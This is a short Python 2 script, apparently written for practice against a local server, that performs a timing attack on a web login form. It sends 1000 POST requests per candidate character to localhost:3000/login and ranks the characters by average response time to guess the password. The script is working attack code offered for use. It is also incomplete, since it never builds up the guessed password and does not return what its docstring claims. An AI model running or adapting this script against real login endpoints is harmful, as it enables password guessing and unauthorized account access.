#!/usr/bin/env python
'''
    This script attempts to perform timing attacks on web applications. It will
    make a given number of requests to a web server with a specified character 
    set. It will then take the average of the amount of time it took for each 
    character to be processed, and add that to the variable containing what is
    guessed to be the correct password.
'''

import time
import requests
import string

USERNAME = 'test'
URL = 'http://localhost:3000/login'
#CHARSET = string.ascii_lowercase
CHARSET = 'abcde'
PASSWORD = ''

# set to be the number of requests to set to the server for every character
NUMREQUESTS = 1000

def makerequest():
    '''
        Makes the request to the server with the username/password combo.
        Passes a dict containing the character and a value containing the 
        total amount of time it took for the server to respond to all of 
        the requests containing that character

        Return: the assumed value for the correct character (based on the 
        lowest time value in the dict of characters)
    '''
    chartimes = {}
    chartimeavg = {}

    # for every character in the characterset, make a request
    for c in CHARSET:
        # initialize the time for the character to be 0
        chartimes[c] = 0.0

        print "Sending " + str(NUMREQUESTS) + " requests to the server for the character " + c
        parameters = {'username': USERNAME, 'password': c}
        for i in range(0,NUMREQUESTS):
            start = time.time()
            # make request
            r = requests.post(URL, data=parameters)
            #print "response is: " + r.text
            end = time.time()
            chartimes[c] += end - start

    # get avg of chartimes
    chartimeavg = getaverage(chartimes)

    # create a counter for the following for loop
    n = 0

    # sort the characters based on the average time
    for key, value in sorted(chartimeavg.iteritems(), key=lambda (k,v): (v,k)):
        print "%s: %s" % (key, value)
        #if n < 1:
        #    print "%s: %s" % (key, value)
        #n += 1



def getaverage(chartimes):
    '''
        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
        are character: total_time where total_time is the total amount of time 
        it took the server to respond to all of the requests for that character
        collectively.

        Return: the dict in a key:value pair where the value is the average 
        amount of time for all of the requests 
    '''
    chartimeavg = {}

    # get average time for each request for every character
    for char in chartimes:
        print "Total time to make " + str(NUMREQUESTS) + " requests for " + char + " was " + str(chartimes[char]) + " seconds."
        chartimeavg[char] = chartimes[char]/NUMREQUESTS

    return chartimeavg


if __name__ == '__main__':
    makerequest()
